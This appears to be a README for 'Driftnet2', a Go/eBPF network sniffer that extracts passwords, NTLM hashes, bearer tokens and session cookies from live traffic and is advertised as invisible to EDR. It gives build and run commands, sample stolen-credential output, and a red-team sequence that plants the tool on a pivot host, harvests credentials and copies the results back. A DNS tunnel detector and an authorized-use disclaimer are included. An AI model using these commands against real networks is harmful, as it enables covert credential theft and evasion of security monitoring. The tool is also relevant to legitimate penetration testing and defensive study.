# Driftnet2 — Kernel-Level Network Sniffing & Credential Extraction

**Silently capture credentials, tokens, and session cookies from live network traffic — at the kernel level, invisible to EDR.**

[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
[![eBPF](https://img.shields.io/badge/eBPF-Linux%205.8+-orange)](https://ebpf.io)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
[![Protocols](https://img.shields.io/badge/protocols-8-green)]()

Driftnet2 is a modern reincarnation of the classic [driftnet](https://github.com/deiv/driftnet) tool — but instead of just capturing images, it extracts **credentials, tokens, hashes, and detects DNS tunnels** from network traffic. It operates at two levels:

- **eBPF/XDP mode** (Linux 5.8+) — hooks into the kernel before userspace sees the packet. No `/proc/net/packet`, no socket, invisible to EDR.
- **AF_PACKET mode** (Linux, macOS, BSD) — standard libpcap fallback for anywhere.

```
┌─────────────────────────────────────────────────────────┐
│ driftnet2 v1.0  │  eth0     │  XDP       │  pkts: 12,847│
├─────────────────────────────────────────────────────────┤
│ 14:32:05 HTTP  10.0.0.15       → 192.168.1.100:443     │
│   🔑 admin:Spring2026!                                    │
│   🍪 session=eyJhbGciOiJS...                              │
│ 14:32:12 SMB   10.0.0.15       → 10.0.0.5:445          │
│   ⚡ admin::DOMAIN:aabbccdd...                            │
│ 14:32:15 FTP   10.0.0.15       → 10.0.0.8:21           │
│   🔑 ftpuser:ftppass                                      │
│ 14:32:18 POP3  10.0.0.15       → 10.0.0.3:110          │
│   🔑 bob@corp.local:mailpass                              │
│ 14:32:22 DNS   10.0.0.15       → 8.8.8.8:53            │
│   🕳️  TUNNEL: B64data.c2.example.com                     │
├─────────────────────────────────────────────────────────┤
│ Credentials: 5  │ Sessions: 2  │ Tunnels: 1  │ 4m12s   │
└─────────────────────────────────────────────────────────┘
```

## What it extracts (8 protocols)

| Protocol | Port | Credential Type | Example |
|----------|------|----------------|---------|
| **HTTP** | 80,443,8080 | Basic Auth, POST forms, Bearer tokens, session cookies | `admin:Spring2026!` |
| **DNS** | 53 | Tunnel detection (long subdomain queries, high entropy) | `b64data.c2.example.com` |
| **SMB** | 445 | NTLMv2 hash (user, domain, challenge, response) | `DOMAIN\admin:hash` |
| **LDAP** | 389 | Simple bind credentials | `cn=admin,dc=corp:password` |
| **FTP** | 21 | USER/PASS commands | `ftpuser:ftppass` |
| **Telnet** | 23 | Login prompt credentials | `root:admin123` |
| **POP3** | 110 | USER/PASS authentication | `user@domain.com:mailpass` |
| **IMAP** | 143 | LOGIN command | `user@domain.com:mailpass` |
| **SMTP** | 25,587 | AUTH LOGIN/PLAIN | `user@domain.com:smtppass` |

## Quick Start

```bash
# Build
go build -o driftnet2 ./cmd/driftnet2

# macOS — sniff WiFi
./driftnet2 -iface en0

# Linux — sniff ethernet
./driftnet2 -iface eth0

# HTTP + FTP credentials only
./driftnet2 -iface en0 --proto http,ftp

# Save to PCAP + JSON simultaneously
./driftnet2 -iface eth0 -w capture.pcap -output creds.json

# Offline PCAP analysis
./driftnet2 -pcap capture.pcap --proto http,dns

# Verbose (show all protocol events, not just credentials)
./driftnet2 -iface eth0 -v
```

### Linux eBPF/XDP mode (EDR-invisible)

```bash
# 1. Compile eBPF program
make bpf          # requires clang

# 2. Build + run
make build
sudo ./driftnet2 -iface eth0     # auto-uses XDP if bpf/xdp_sniff.o exists

# XDP hooks at kernel level — zero userspace footprint
# /proc/net/packet shows nothing
# EDR/XDR sees nothing
```

## Comparison

| Feature | driftnet2 | bettercap | net-creds | pcredz | tshark |
|---------|:---:|:---:|:---:|:---:|:---:|
| eBPF/XDP kernel sniff | ✓ | ✗ | ✗ | ✗ | ✗ |
| EDR invisible | ✓ | ✗ | ✗ | ✗ | ✗ |
| HTTP Basic Auth | ✓ | ✓ | ✓ | ✗ | manual |
| HTTP POST form | ✓ | ✓ | ✓ | ✗ | manual |
| HTTP Bearer token | ✓ | ✗ | ✗ | ✗ | manual |
| HTTP session cookies | ✓ | ✗ | ✓ | ✗ | manual |
| SMB NTLM hash | ✓ | ✗ | ✗ | ✗ | manual |
| DNS tunnel detection | ✓ | ✗ | ✗ | ✗ | manual |
| FTP credentials | ✓ | ✗ | ✗ | ✗ | manual |
| Telnet credentials | ✓ | ✗ | ✗ | ✗ | manual |
| POP3/IMAP/SMTP | ✓ | ✗ | ✗ | ✗ | manual |
| Offline PCAP | ✓ | ✗ | ✓ | ✓ | ✓ |
| PCAP write | ✓ | ✓ | ✗ | ✗ | ✓ |
| JSON export | ✓ | ✓ | ✗ | ✗ | ✗ |
| Terminal TUI | ✓ | ✓ | ✗ | ✗ | ✗ |
| Cross-platform | ✓ | ✓ | ✓ | ✗ | ✓ |
| Single binary | ✓ 5MB | ✓ 15MB | ✗ Python | ✗ Python | ✓ |
| Maintained | 2026 | ✓ | 2014 | 2015 | ✓ |

## Red Team Scenarios

### Pivot point sniffing

```bash
scp driftnet2 user@pivot:/tmp/driftnet2
ssh user@pivot "sudo /tmp/driftnet2 -iface eth1 -output /tmp/creds.json &"
sleep 300
scp user@pivot:/tmp/creds.json .
ssh user@pivot "sudo pkill driftnet2"
```

### Catch clear-text protocols

```bash
# Internal network often has FTP/Telnet/POP3 in cleartext
./driftnet2 -iface eth0 --proto ftp,telnet,pop3,smtp -w internal.pcap

# Output:
#   🔑 ftpadmin:Spring2026!       (FTP)
#   🔑 root:cisco123              (Telnet)
#   🔑 ceo@corp.com:password1     (POP3)
```

### DNS tunnel hunter

```bash
./driftnet2 -iface eth0 --proto dns -v

# Detects any C2 hiding in DNS:
#   🕳️  TUNNEL: AQIDBAUG.c2.example.com (TXT)
#   🕳️  TUNNEL: payload.malware-cdn.net (CNAME)
```

## Disclaimer

For **authorized penetration testing, red team assessments, and security research only**. Capturing network traffic without explicit authorization is illegal.

## License

MIT
